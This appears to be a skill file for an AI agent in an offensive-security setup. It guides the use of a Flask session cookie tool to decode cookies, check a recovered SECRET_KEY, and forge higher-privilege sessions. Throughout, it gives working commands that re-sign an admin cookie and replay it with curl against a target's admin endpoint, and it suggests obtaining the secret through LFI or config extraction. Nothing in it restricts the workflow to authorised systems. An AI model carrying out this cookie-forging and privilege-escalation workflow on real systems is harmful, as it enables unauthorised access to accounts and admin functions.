---
name: tool-flask-session-cookie-manager
description: Use when a target uses Flask signed session cookies and you need a practical operator guide to decode cookie contents, validate a recovered secret key, or forge a higher-privilege session.
---

# Tool Guide: flask-session-cookie-manager

## Overview

Use this skill when a Flask app stores useful state in client-side signed session cookies and you already have either a captured cookie, a candidate `SECRET_KEY`, or both.

## When to Use

- The target sets a Flask-style session cookie and you want to inspect the payload quickly.
- Source code, config, environment, or LFI exposed a likely Flask `SECRET_KEY`.
- You need to re-sign a modified cookie to escalate role, username, or workflow state.

## Remote Paths

- Tool repo: `/root/niuniu-agent/tools/flask-session-cookie-manager`

Typical upstream entrypoints:

- `flask_session_cookie_manager3.py`
- `flask_session_cookie_manager2.py`

If the local repo layout differs, inspect it first:

```bash
cd /root/niuniu-agent/tools/flask-session-cookie-manager
find . -maxdepth 2 -type f | sort
```

## Recommended Workflow

1. Capture the session cookie value and note the cookie name.
2. Decode the cookie without a secret first to understand the structure and field names.
3. If you recover a likely `SECRET_KEY`, decode again with the key to confirm you can parse it cleanly.
4. Re-sign only the minimum fields needed for escalation, such as `user_id`, `username`, `role`, `is_admin`, or feature flags.
5. Replay the forged cookie against the smallest privileged endpoint first before exploring deeper.

## Practical Commands

Show help:

```bash
cd /root/niuniu-agent/tools/flask-session-cookie-manager
python3 flask_session_cookie_manager3.py -h
```

Decode without a secret key to inspect raw structure:

```bash
cd /root/niuniu-agent/tools/flask-session-cookie-manager
python3 flask_session_cookie_manager3.py decode \
  -c 'SESSION_COOKIE_VALUE'
```

Decode with a recovered Flask `SECRET_KEY`:

```bash
cd /root/niuniu-agent/tools/flask-session-cookie-manager
python3 flask_session_cookie_manager3.py decode \
  -c 'SESSION_COOKIE_VALUE' \
  -s 'RECOVERED_SECRET_KEY'
```

Encode or re-sign a forged admin cookie:

```bash
cd /root/niuniu-agent/tools/flask-session-cookie-manager
python3 flask_session_cookie_manager3.py encode \
  -s 'RECOVERED_SECRET_KEY' \
  -t '{"username":"admin","role":"admin","is_admin":true}'
```

Use the new value in a focused probe:

```bash
curl -i http://TARGET/admin \
  -H 'Cookie: session=NEW_FORGED_COOKIE'
```

## Operational Notes

- Flask signed session cookies are integrity-protected, not encrypted. Even without the secret, field names and structure often reveal the shortest escalation path.
- Prioritize cookie fields that gate authorization or workflow transitions instead of changing many values at once.
- If the target uses a non-default cookie name, replay the forged value under that exact name.
- Pair this tool with source/LFI/config extraction when the secret is not known yet.

## Common Mistakes

- Forging a cookie before verifying the real cookie name, domain, or path.
- Changing too many fields at once and losing the minimal proof of privilege change.
- Assuming every Flask-looking cookie is server-side session storage; first confirm it is actually a signed client-side session.
